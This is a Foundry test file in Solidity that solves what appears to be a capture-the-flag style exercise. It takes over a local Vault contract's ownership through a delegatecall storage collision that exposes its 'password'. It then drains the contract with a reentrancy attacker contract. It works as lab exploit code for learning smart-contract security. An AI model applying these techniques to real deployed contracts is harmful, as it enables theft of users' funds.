// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from"forge-std/Test.sol";
import "../task/day21/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // 用户Playwe通过vault的fallback合约调用logic合约中的owner，这样简介便将vault中的owner改变
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        address(vault).call(abi.encodeWithSelector(
            bytes4(keccak256("changeOwner(bytes32,address)")), 
            password, 
            address(palyer)
        ));
        vault.openWithdraw();
        vault.deposite{value: 0.1 ether}();
        ReentrancyAttrack reentrancy = new ReentrancyAttrack(address(vault));
        vm.deal(address(reentrancy), 1 ether);
        reentrancy.attrack();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}

contract ReentrancyAttrack {
    Vault public vault;
    address public owner ;
    // uint256 withdrawAmount = 0.1 ether;

    constructor(address _vault) {
        vault = Vault(payable(_vault));
        owner = msg.sender;
    }

    fallback() external payable {
        // 判断logic是否还有钱
        bool scueess = vault.isSolve();
        if (!scueess) {
            vault.withdraw();
        }
    }

    function attrack() public {
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
        payable(owner).transfer(address(this).balance);
    }
}